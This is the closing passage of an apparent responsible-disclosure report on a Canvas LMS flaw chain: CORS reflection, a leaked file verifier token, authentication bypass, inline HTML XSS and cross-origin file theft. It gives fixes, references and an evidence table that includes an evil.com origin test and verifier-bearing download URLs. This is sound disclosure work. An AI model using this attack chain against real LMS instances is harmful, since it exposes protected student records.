                  content_type&.include?("svg") ||
                  %w[.html .htm .svg .xhtml].include?(File.extname(filename).downcase)
  
  content_type.start_with?("text") || content_type.start_with?("image")
end
```

### Recommended Deployment Order

1. **Fix 1** (CORS whitelist) — Eliminates the root cause. Deploy immediately.
2. **Fix 2** (enable `deprecate_uuid_in_files_api`) — Eliminates the verifier leak. Deploy with Fix 1.
3. **Fix 3** (CSP on files) — Blocks the XSS escalation path. Deploy in next release.
4. **Fix 4** (attachment disposition) — Defense in depth. Deploy in next release.

---

## References

- **CWE-942:** Overly Permissive Cross-domain Whitelist — https://cwe.mitre.org/data/definitions/942.html
- **CWE-639:** Authorization Bypass Through User-Controlled Key — https://cwe.mitre.org/data/definitions/639.html
- **CWE-79:** Improper Neutralization of Input During Web Page Generation — https://cwe.mitre.org/data/definitions/79.html
- **OWASP Testing Guide — CORS:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing
- **Canvas LMS Source (files_controller.rb):** https://github.com/instructure/canvas-lms/blob/master/app/controllers/files_controller.rb — lines 1811-1822 (`open_cors`, `open_limited_cors`)
- **Canvas LMS Source (attachment.rb):** https://github.com/instructure/canvas-lms/blob/master/app/models/attachment.rb — `inline_content?` method
- **Canvas LMS Source (session_store.rb):** `SameSite=None` cookie configuration for LTI iframe support
- **Canvas LMS Source (api_v1/attachment.rb):** `attachment_json` method — UUID/verifier inclusion logic
- **FERPA (20 U.S.C. Section 1232g):** Federal protection of student education records
- **GDPR Article 33:** 72-hour breach notification requirement

---

## Evidence Files

All evidence was captured in Burp Suite Repeater during testing. Raw HTTP requests and responses are preserved in Burp project file. Summary of evidence:

| # | Evidence | Description | Report Section |
|---|----------|-------------|----------------|
| 1 | Burp Repeater — CORS reflection (file 7) | Full HTTP request with `Origin: https://evil.com` and response showing `access-control-allow-origin: https://evil.com` + `access-control-allow-credentials: true` with JSON body containing `uuid` verifier token | Step 2 |
| 2 | Burp Repeater — CORS reflection (file 8) | Same CORS test for `notes.html`, response contains `uuid` for the HTML XSS payload file | Step 5a |
| 3 | Burp Repeater — Auth bypass with verifier (file 7) | Request with **no Cookie header** to `/files/7/download?verifier=gte8Y3E54aszwUCMeOD4YTGMvzeAeXhxZdbkVrGe` returning HTTP 200 with full file contents | Step 4a |
| 4 | Burp Repeater — Control test without verifier | Request to `/files/7/download` with no Cookie and no verifier, returning HTTP 302 redirect to `/login` | Step 4b |
| 5 | Burp Repeater — HTML inline rendering (file 8) | Request to `/files/8/download?verifier=8IIMUC3Wzq6omLBMWexQTUU8EFeOPDEAihNVuRVB` returning `content-type: text/html` + `content-disposition: inline` with JavaScript payload in body | Step 5b |
| 6 | Browser screenshot — XSS alert box | Browser displaying JavaScript alert "XSS on localhost" when visiting the HTML file download URL, proving script execution on Canvas domain | Step 5c |
| 7 | Browser screenshot — PoC exfiltration page | `exploit-poc.html` running in browser, showing successful cross-origin file content theft including leaked verifier and full file contents | Step 6c |
| 8 | `exploit-poc.html` | Complete browser-based PoC demonstrating the full CORS-to-verifier-leak-to-authentication-bypass-to-file-exfiltration chain | Step 6a |

---

*This report was prepared following responsible disclosure practices. All testing was performed on a locally deployed Canvas LMS instance under the researcher's control. No production Canvas instances were tested or harmed.*
